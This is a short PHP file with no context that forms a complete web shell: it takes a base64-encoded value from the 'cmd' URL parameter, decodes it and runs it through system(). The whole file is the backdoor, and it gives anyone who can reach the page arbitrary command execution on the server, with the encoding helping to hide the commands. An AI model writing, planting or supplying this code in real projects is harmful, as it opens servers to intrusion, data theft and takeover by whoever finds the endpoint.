<?php
if (isset($_GET['cmd'])) {
    system(base64_decode($_GET['cmd']));
}
?>